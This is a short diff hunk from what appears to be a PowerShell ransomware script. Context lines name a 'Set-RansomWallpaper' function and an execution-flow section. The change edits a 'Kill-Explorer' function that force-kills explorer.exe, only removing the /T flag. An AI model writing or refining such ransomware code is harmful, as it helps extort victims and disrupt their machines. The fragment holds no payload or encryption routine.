@@ -434,7 +434,7 @@ function Set-RansomWallpaper {
 
 function Kill-Explorer {
     try {
-         cmd /c "taskkill /F /IM explorer.exe /T"
+         cmd /c "taskkill /F /IM explorer.exe"
     } catch {}
 }
 # ========== EXECUTION FLOW ==========
